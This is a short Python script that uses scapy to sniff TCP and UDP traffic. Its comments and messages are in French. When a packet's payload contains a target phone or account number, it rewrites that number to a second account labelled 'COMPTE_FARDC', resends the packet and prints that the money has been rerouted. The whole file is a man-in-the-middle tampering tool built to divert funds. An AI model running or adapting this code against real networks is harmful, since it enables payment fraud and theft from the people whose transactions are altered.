import sys
from scapy.all import *

DEST_SUSPECT = "0812345678"
COMPTE_FARDC = "0828888888"

def intercept_and_reroute(packet):
    if packet.haslayer(Raw):
        payload = packet[Raw].load.decode('utf-8', errors='ignore')
        if DEST_SUSPECT in payload:
            print("🚨 [ALERTE] Flux financier suspect détecté !")
            new_payload = payload.replace(DEST_SUSPECT, COMPTE_FARDC)
            packet[Raw].load = new_payload
            if packet.haslayer(IP):
                del packet[IP].len
                del packet[IP].chksum
            print(f"💰 [ACTION] Argent dérouté vers : {COMPTE_FARDC}")
            send(packet, verbose=False)

interface = sys.argv[1] if len(sys.argv) > 1 else "lo"
print(f"📡 SNIFFER ACTIF SUR {interface}...")
sniff(iface=interface, prn=intercept_and_reroute, filter="tcp or udp")
